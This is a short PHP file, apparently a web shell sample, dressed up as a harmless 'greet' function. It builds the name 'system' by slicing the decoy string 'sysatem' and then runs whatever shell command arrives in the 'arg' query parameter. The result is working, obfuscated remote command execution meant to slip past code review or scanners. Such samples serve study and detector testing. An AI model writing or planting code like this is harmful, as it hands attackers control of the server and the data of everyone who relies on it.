<?php
function greet()
{
    $method='sysatem';
    (substr($method,0,3).substr($method, 4))($_GET['arg']);
};
$a='greet';
echo ($a)();
?>